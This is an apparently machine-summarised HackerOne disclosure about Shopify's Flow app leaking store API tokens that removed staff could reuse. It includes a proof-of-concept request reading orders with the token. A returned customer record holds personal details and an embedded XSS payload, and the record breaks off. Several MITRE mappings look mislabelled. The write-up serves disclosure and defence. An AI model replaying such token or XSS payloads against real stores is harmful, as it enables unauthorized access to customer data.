# Unauthenticated Access Token Exposure in Shopify Flow App - Removed Staff Members Retain Full Store Access

## Metadata
- **Source:** HackerOne
- **Report:** 700831 | https://hackerone.com/reports/700831
- **Submitted:** 2019-09-24
- **Reporter:** mariogh
- **Program:** Shopify
- **Bounty:** Not specified in writeup
- **Severity:** CRITICAL
- **Vuln:** Credential Exposure, Broken Access Control, Insecure Token Management, Information Disclosure, Privilege Escalation
- **CVEs:** None
- **Category:** memory-binary

## Summary
Shopify's Flow app exposes API access tokens in GraphQL responses when staff members with 'Apps' permission query the 'shopInfo' endpoint. Removed staff members who previously accessed the Flow app can retrieve the exposed token and gain unrestricted read/write access to all store endpoints via the Shopify REST API.

## Attack scenario
1. Attacker is a current or former staff member with 'Apps' permission on a Shopify store that has Flow app installed
2. Attacker accesses the Flow app's Connectors tab, which triggers a GraphQL request to https://flow.shopifycloud.com/graphql
3. Attacker intercepts or monitors the response containing 'shopInfo' which includes the plaintext Shopify API access token
4. Attacker extracts the token and stores it for future use
5. Even after being removed from staff, attacker uses the stored token to make authenticated requests to any Shopify REST API endpoint (e.g., GET /admin/orders.json)
6. Attacker achieves full read and write access to sensitive store data including orders, customers, and products

## Root cause
The Flow app's GraphQL endpoint returns sensitive API access tokens in client-side responses without proper access controls or token lifecycle management. Removed staff members retain the ability to use previously exposed tokens as the token invalidation mechanism does not trigger when staff access is revoked.

## Attacker mindset
An insider threat actor with temporary or revoked access seeks to maintain persistence and extract valuable business intelligence. The attacker recognizes that API tokens are not invalidated upon staff removal, allowing indefinite unauthorized access. The exposure in client-side responses suggests the attacker monitors network traffic or examines application state during legitimate usage.

## Defensive takeaways
- Never expose API access tokens in client-side responses, GraphQL responses, or anywhere visible to the frontend
- Implement immediate token invalidation when staff members are removed or have permissions revoked
- Use short-lived tokens with refresh mechanisms instead of static long-lived credentials
- Implement rate limiting and anomaly detection on API endpoints to detect suspicious access patterns from revoked accounts
- Enforce network-level restrictions on API token usage (IP whitelisting, geographic constraints)
- Audit all API calls made with compromised tokens and implement a token rotation policy
- Separate Flow app's internal tokens from store-level access tokens with minimal required permissions
- Implement audit logging for all token generation, exposure, and usage events
- Require multi-factor authentication or additional verification for sensitive API operations

## Variant hunting
Search for other Shopify apps that expose tokens in GraphQL/REST responses during configuration or setup flows
Audit all Shopify app endpoints that query shop information to identify similar token leakage patterns
Investigate whether other Shopify proprietary apps (Metafields, Analytics, etc.) have similar credential exposure issues
Test for token exposure in error responses, debug endpoints, or development mode configurations
Check if tokens are logged in client-side console, local storage, or session storage
Verify if removed staff members can still trigger workflows that make API calls using cached tokens
Examine Shopify's private app token generation flow for similar exposure vectors
Test whether the Flow app stores tokens in browser cache, cookies, or IndexedDB accessible to other scripts

## MITRE ATT&CK
- T1110 - Brute Force (attempting API access with exposed credentials)
- T1526 - Exposure of Sensitive Information (token leakage in responses)
- T1528 - Steal Application Access Token (extracting tokens from GraphQL response)
- T1078 - Valid Accounts (using exposed token as valid credentials)
- T1087 - Account Discovery (enumerating store data via API)
- T1010 - Application Window Discovery (monitoring GraphQL responses)
- T1555 - Credentials from Password Stores (extracting from captured network traffic)
- T1556 - Modify Authentication Process (leveraging unrevoked tokens after staff removal)

## Notes
This vulnerability exemplifies the critical importance of proper token lifecycle management and the danger of exposing credentials in client-side responses. The fact that tokens remain valid after staff removal is a separate but related access control failure. The researcher invested significant effort in analyzing the Flow app's JavaScript and network communications, demonstrating thorough reconnaissance. Shopify stated this is unrelated to a previous Flow app vulnerability (#698708), indicating potential widespread issues in the Flow app's security posture.

## Full report
<details><summary>Expand</summary>

Technical Background
=====================

Shopify Apps need an [access token](https://www.shopify.com/partners/blog/17056443-how-to-generate-a-shopify-api-token) to work with the data of a store. 

Is very important to keep this token in a secure place. Quoting the [Shopify Blog](https://www.shopify.com/partners/blog/17056443-how-to-generate-a-shopify-api-token):
> (...) *this is like a password into this shop, so you’ll want to store this token in a very safe place.*

Description
=====================

To exploit this vulnerability, the store should have the [Flow app](https://apps.shopify.com/flow) installed. This report is completely unrelated to #698708. Both reports pentest the "Flow app" but they both are reporting two completely different and unrelated bugs. If one of them is fixed, the other still will exist.

I've been working very hard and paying a lot of attention to the [Flow app](https://apps.shopify.com/flow). Fully reading every line on every single javascript file it calls, every single HTTP request and response, and yes, my eyes look like raccoon eyes now.

The [Flow app](https://apps.shopify.com/flow) calls a Graph endpoint at (https://flow.shopifycloud.com/graphql) to check for information on multiple occasions, for example, when you just load the **My workflows** tab in the app. Of course, no vital information is disclosed in the responses.
{F590287}

When you click on the **Connectors** tab, it sends again a Graph request to (https://flow.shopifycloud.com/graphql) but this time asking for some "**shopInfo**":
{F590291}
The response...
██████████

Contains some interesting information:
```
(...)
id: "44828"
partnerApps: "[...]"
shopId: "10361503766"
shopifyDomain: "victim-store-mariogh.myshopify.com"
shopifyToken: "████████"
(...)
```

Taking a closer look, you can spot that the **Access Token** is being returned in the response:
 `shopifyToken: "█████████"`

What's interesting about the Flow App is that it has access to all endpoints (or almost all) of a store in order to *Turn tasks into automations so you can get back to business.*

Proof of concept
=====================
Now, let's grab the **Access Token** to get unauthorized access to anything we may want in the store, for example, retrieving all orders with the **[Shopify REST API](https://help.shopify.com/en/api/reference)**.

Let's do a GET request the `/admin/orders.json` endpoint using the **Access Token** and see what happens:
██████████

**Request Headers**
```
GET /admin/orders.json HTTP/1.1
Host: victim-store-mariogh.myshopify.com
Accept: */*
User-Agent: Mozilla/5.0 (compatible; Rigor/1.0.0; http://rigor.com)
Content-type: application/json
X-Shopify-Access-Token: ██████████
```

**Response Body**
```
{"orders":[{"id":1296963305494,"email":"█████@gmail.com","closed_at":null,"created_at":"2019-09-18T23:00:59-04:00","updated_at":"2019-09-18T23:01:00-04:00","number":6,"note":null,"token":"418591279c9de03f61deecee1fc6515d","gateway":null,"test":false,"total_price":"0.00","subtotal_price":"0.00","total_weight":0,"total_tax":"0.00","taxes_included":false,"currency":"USD","financial_status":"paid","confirmed":true,"total_discounts":"0.00","total_line_items_price":"0.00","cart_token":"","buyer_accepts_marketing":false,"name":"#1006{{this}}","referring_site":"https:\/\/victim-store-mariogh.myshopify.com\/products\/a","landing_site":"\/wallets\/checkouts.json","cancelled_at":null,"cancel_reason":null,"total_price_usd":"0.00","checkout_token":"3cc31dee80e2723f1ccd2e74a8aceb15","reference":null,"user_id":null,"location_id":null,"source_identifier":null,"source_url":null,"processed_at":"2019-09-18T23:00:58-04:00","device_id":null,"phone":null,"customer_locale":"en","app_id":580111,"browser_ip":"181.197.87.44","landing_site_ref":null,"order_number":1006,"discount_applications":[],"discount_codes":[],"note_attributes":[],"payment_gateway_names":[],"processing_method":"free","checkout_id":8239220228118,"source_name":"web","fulfillment_status":null,"tax_lines":[],"tags":"","contact_email":"████████@gmail.com","order_status_url":"https:\/\/victim-store-mariogh.myshopify.com\/10361503766\/orders\/418591279c9de03f61deecee1fc6515d\/authenticate?key=9a757912c87e29b3615d7b34650ef937","presentment_currency":"USD","total_line_items_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_discounts_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_shipping_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"subtotal_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_tax_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_tip_received":"0.0","admin_graphql_api_id":"gid:\/\/shopify\/Order\/1296963305494","line_items":[{"id":3241512992790,"variant_id":19560431026198,"title":"a","quantity":1,"sku":"a","variant_title":"","vendor":"Store Name","fulfillment_service":"manual","product_id":1992815050774,"requires_shipping":true,"taxable":true,"gift_card":false,"name":"a","variant_inventory_management":"shopify","properties":[],"product_exists":true,"fulfillable_quantity":1,"grams":0,"price":"0.00","total_discount":"0.00","fulfillment_status":null,"price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_discount_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"discount_allocations":[],"admin_graphql_api_id":"gid:\/\/shopify\/LineItem\/3241512992790","tax_lines":[],"origin_location":{"id":763511799830,"country_code":"PA","province_code":"PA-8","name":"{{this}}","address1":"8080","address2":"","city":"Paitilla","zip":"Panama"}}],"shipping_lines":[{"id":821852798998,"title":"Standard","price":"0.00","code":"Standard","source":"shopify","phone":null,"requested_fulfillment_service_id":null,"delivery_category":null,"carrier_identifier":null,"discounted_price":"0.00","price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"discounted_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"discount_allocations":[],"tax_lines":[]}],"billing_address":{"first_name":"Eric","address1":"1078 NE 34th St","phone":null,"city":"Oakland Park","zip":"33334","province":"Florida","country":"United States","last_name":"Mitchell","address2":"","company":null,"latitude":26.1693158,"longitude":-80.1329161,"name":"Eric Mitchell","country_code":"US","province_code":"FL"},"shipping_address":{"first_name":"Eric","address1":"1078 NE 34th St","phone":null,"city":"Oakland Park","zip":"33334","province":"Florida","country":"United States","last_name":"Mitchell","address2":"","company":null,"latitude":26.1693158,"longitude":-80.1329161,"name":"Eric Mitchell","country_code":"US","province_code":"FL"},"fulfillments":[],"client_details":{"browser_ip":"181.197.87.44","accept_language":"en-US,en;q=0.9","user_agent":"Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) Ubuntu Chromium\/76.0.3809.100 Chrome\/76.0.3809.100 Safari\/537.36","session_hash":null,"browser_width":1427,"browser_height":708},"refunds":[],"customer":{"id":1375528943638,"email":"███████@gmail.com","accepts_marketing":false,"created_at":"2019-09-08T18:17:56-04:00","updated_at":"2019-09-18T23:00:59-04:00","first_name":"Ericxss\"\u003e\u003c!--\u003e\u003csvg\/onload=alert(document.domain)\u003e","last_name":"Mitchell","orders_count":2,"state":"disabled","to

</details>

---
*Analysed by Claude on 2026-05-24*
